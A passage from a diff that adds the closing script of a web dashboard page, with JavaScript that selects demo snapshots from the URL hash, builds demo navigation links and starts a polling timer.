+    if (match && Object.prototype.hasOwnProperty.call(DEMO, match[1])) return match[1];
+    return Object.prototype.hasOwnProperty.call(DEMO, "done") ? "done" : names[0];
+  }
+
+  function showDemo() {
+    var name = demoName();
+    var snap = DEMO[name];
+    if (!snap) return;
+    closeSheet();
+    var links = $("demo-links");
+    var current = links.children;
+    for (var i = 0; i < current.length; i++) {
+      if (current[i].getAttribute("data-demo") === name) current[i].setAttribute("aria-current", "page");
+      else current[i].removeAttribute("aria-current");
+    }
+    state.lastOk = snap.generatedAt;
+    state.sig = "";
+    show(snap);
+  }
+
+  function startDemo() {
+    $("demo-bar").hidden = false;
+    var links = $("demo-links");
+    Object.keys(DEMO).forEach(function (name) {
+      var a = el("a", "demo-link", name.replace(/-/g, " "));
+      a.setAttribute("href", "#demo=" + name);
+      a.setAttribute("data-demo", name);
+      links.appendChild(a);
+    });
+    window.addEventListener("hashchange", showDemo);
+    showDemo();
+  }
+
+  // ---------------------------------------------------------------------------------------------
+  // Start
+  // ---------------------------------------------------------------------------------------------
+  setInterval(tick, 1000);
+  if (DEMO) {
+    startDemo();
+  } else {
+    poll();
+  }
+})();
+</script>
+</body>
+</html>
